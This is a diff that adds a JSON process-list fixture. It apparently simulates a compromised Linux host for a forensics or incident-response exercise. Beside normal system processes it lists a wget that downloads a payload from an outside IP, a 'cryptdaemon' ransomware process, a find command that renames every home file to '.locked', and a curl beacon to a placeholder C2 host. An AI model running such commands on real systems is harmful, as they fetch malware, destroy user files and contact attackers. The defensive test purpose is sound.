@@ -1,0 +1,72 @@
+[
+  {
+    "pid": 1,
+    "ppid": 0,
+    "user": "root",
+    "command": "/sbin/init",
+    "state": "S"
+  },
+  {
+    "pid": 502,
+    "ppid": 1,
+    "user": "messagebus",
+    "command": "/usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile",
+    "state": "S"
+  },
+  {
+    "pid": 711,
+    "ppid": 1,
+    "user": "systemd-resolve",
+    "command": "/lib/systemd/systemd-resolved",
+    "state": "S"
+  },
+  {
+    "pid": 880,
+    "ppid": 1,
+    "user": "root",
+    "command": "/usr/sbin/cron -f",
+    "state": "S"
+  },
+  {
+    "pid": 1834,
+    "ppid": 1,
+    "user": "analyst",
+    "command": "/usr/sbin/sshd -D",
+    "state": "S"
+  },
+  {
+    "pid": 2241,
+    "ppid": 1834,
+    "user": "victim",
+    "command": "wget -O /tmp/payload.bin http://203.0.113.47/update.bin",
+    "state": "R"
+  },
+  {
+    "pid": 2248,
+    "ppid": 2241,
+    "user": "victim",
+    "command": "cryptdaemon --config /etc/cryptdaemon.conf",
+    "state": "R"
+  },
+  {
+    "pid": 2249,
+    "ppid": 2248,
+    "user": "victim",
+    "command": "python3 /tmp/x.py",
+    "state": "R"
+  },
+  {
+    "pid": 2254,
+    "ppid": 2248,
+    "user": "victim",
+    "command": "/bin/sh -c find /home/victim -type f -not -name '*.locked' -exec mv {} {}.locked \\;",
+    "state": "R"
+  },
+  {
+    "pid": 2399,
+    "ppid": 2248,
+    "user": "victim",
+    "command": "curl https://c2-relay.evil-corp-demo.test:443/beat",
+    "state": "S"
+  }
+]
